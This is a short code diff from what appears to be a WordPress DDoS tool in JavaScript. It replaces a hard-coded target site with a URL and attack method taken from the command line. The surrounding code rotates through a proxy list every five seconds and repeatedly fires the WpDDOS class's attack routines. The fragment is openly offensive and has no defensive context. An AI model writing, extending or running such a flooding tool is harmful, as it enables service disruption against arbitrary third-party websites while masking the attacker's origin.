@@ -7,10 +7,14 @@ const rp = require('request-promise');
 
 
 (() => {
+
+    let url = process.argv[2];
+    let method = process.argv[3] || 'getWpSearch';
+
     let pc = new ProxyChanger('./proxylist.txt', 5000); //change after 5 sec
     pc.run();
 
-    let wp = new WpDDOS('http://www.freezingcomputer.com/', 'getWpSearch');
+    let wp = new WpDDOS(url, method);
     let task = function () {
         wp.runAll();
     };
